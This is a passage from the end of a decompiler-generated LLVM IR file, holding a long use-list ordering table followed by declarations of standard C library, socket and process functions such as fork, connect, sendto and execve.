785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636 }
  uselistorder i32* @r4, { 50, 536, 181, 5, 182, 183, 4, 184, 185, 186, 11, 187, 10, 188, 189, 190, 191, 192, 193, 196, 199, 200, 201, 202, 203, 194, 195, 197, 198, 12, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 218, 220, 221, 222, 223, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 13, 15, 64, 14, 65, 68, 66, 67, 224, 225, 226, 227, 2, 228, 229, 230, 231, 232, 233, 234, 237, 235, 236, 41, 238, 239, 240, 241, 242, 383, 384, 385, 243, 244, 16, 245, 246, 247, 248, 249, 250, 17, 251, 252, 253, 254, 255, 256, 257, 386, 387, 258, 259, 260, 261, 262, 263, 264, 265, 266, 388, 389, 390, 391, 267, 268, 510, 511, 512, 513, 514, 515, 540, 543, 544, 279, 278, 281, 280, 7, 283, 282, 284, 6, 325, 326, 327, 328, 329, 330, 18, 331, 332, 335, 336, 343, 344, 345, 348, 357, 358, 359, 360, 91, 92, 93, 94, 95, 96, 392, 393, 394, 395, 396, 397, 398, 545, 546, 399, 400, 401, 402, 403, 404, 405, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 285, 286, 287, 288, 289, 295, 296, 19, 297, 298, 406, 407, 408, 409, 20, 410, 411, 412, 413, 21, 414, 415, 416, 22, 417, 418, 419, 420, 421, 422, 8, 430, 0, 431, 432, 23, 423, 424, 425, 426, 427, 433, 1, 516, 517, 563, 564, 9, 361, 362, 518, 565, 566, 567, 568, 569, 570, 519, 520, 571, 572, 24, 573, 574, 575, 576, 589, 590, 591, 592, 44, 600, 42, 582, 584, 585, 586, 587, 588, 577, 578, 579, 521, 522, 523, 524, 525, 526, 527, 528, 580, 581, 156, 157, 529, 530, 531, 532, 533, 534, 535, 69, 70, 71, 72, 73, 74, 75, 76, 77, 97, 98, 99, 100, 101, 168, 169, 79, 102, 103, 104, 78, 80, 170, 171, 172, 583, 363, 364, 349, 25, 105, 106, 107, 26, 108, 27, 109, 110, 365, 28, 29, 366, 367, 368, 369, 370, 371, 350, 351, 352, 353, 354, 355, 356, 341, 342, 136, 137, 152, 153, 337, 338, 333, 334, 160, 161, 339, 340, 162, 163, 164, 165, 372, 373, 374, 375, 376, 30, 377, 378, 379, 380, 381, 382, 593, 594, 595, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 299, 300, 301, 302, 303, 304, 305, 306, 290, 291, 292, 293, 294, 111, 31, 112, 113, 307, 32, 308, 309, 114, 115, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 468, 467, 469, 470, 471, 472, 473, 474, 475, 33, 476, 477, 478, 484, 485, 486, 487, 3, 488, 489, 490, 491, 492, 493, 494, 34, 495, 35, 496, 497, 498, 499, 46, 47, 48, 479, 481, 480, 482, 483, 428, 429, 81, 45, 82, 83, 84, 85, 86, 87, 88, 89, 43, 90, 596, 597, 598, 599, 310, 311, 312, 313, 314, 315, 316, 36, 317, 37, 318, 319, 320, 321, 322, 323, 324, 500, 501, 502, 503, 269, 270, 271, 272, 273, 274, 275, 38, 39, 276, 277, 504, 505, 158, 159, 166, 167, 538, 539, 116, 117, 541, 542, 118, 119, 120, 40, 121, 122, 123, 124, 179, 180, 346, 347, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 154, 155, 173, 174, 175, 176, 177, 178, 506, 507, 508, 509, 49, 537 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
